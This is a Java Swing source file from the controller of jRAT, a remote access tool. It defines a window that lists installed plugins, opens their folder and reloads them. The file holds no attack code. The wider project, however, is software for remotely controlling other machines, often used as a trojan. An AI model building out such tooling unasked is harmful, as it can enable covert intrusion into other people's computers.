package se.jrat.controller.ui.frames;

import iconlib.IconUtils;

import java.awt.BorderLayout;
import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JToolBar;
import javax.swing.table.DefaultTableModel;

import jrat.api.RATPlugin;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnDisableEvent;
import se.jrat.controller.Globals;
import se.jrat.controller.addons.Plugins;
import se.jrat.controller.ui.components.DefaultJTable;
import se.jrat.controller.ui.renderers.table.PluginsTableRenderer;

@SuppressWarnings("serial")
public class FramePlugins extends JFrame {

	private JTable table;
	private DefaultTableModel model;

	public FramePlugins() {
		setTitle("Installed Plugins");
		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePlugins.class.getResource("/icons/plugin.png")));
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 585, 356);

		JScrollPane scrollPane = new JScrollPane();

		JToolBar toolBar = new JToolBar();
		toolBar.setFloatable(false);

		JButton btnFolder = new JButton("Open Plugin Folder");
		toolBar.add(btnFolder);
		btnFolder.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					Desktop.getDesktop().open(Globals.getPluginDirectory());
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
		btnFolder.setIcon(IconUtils.getIcon("folder-go"));

		JButton btnReload = new JButton("Reload all");
		toolBar.add(btnReload);
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				reload();
			}
		});
		btnReload.setIcon(IconUtils.getIcon("plugin"));

		table = new DefaultJTable();
		table.setDefaultRenderer(Object.class, new PluginsTableRenderer());
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Name", "Author", "Description", "Version", "Status" }));
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(new BorderLayout(0, 0));
		add(toolBar, BorderLayout.SOUTH);
		add(scrollPane);

		addPlugins();
	}

	public void reload() {
		new Thread(new Runnable() {
			public void run() {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}

				for (Event e : Event.getHandler().getEvents(EventType.EVENT_PLUGIN_DISABLE)) {
					e.perform(new OnDisableEvent());
				}

				try {
					Plugins.getLoader().loadPlugins();
				} catch (Exception e) {
					e.printStackTrace();
				}
				
				addPlugins();
			}
		}).start();
	}

	public void addPlugins() {
		for (int i = 0; i < Plugins.getPlugins().size(); i++) {
			RATPlugin p = Plugins.getPlugins().get(i);
			model.addRow(new Object[] { p.getName(), p.getAuthor(), p.getDescription(), p.getVersion(), /* TODO */ });
		}
	}
}
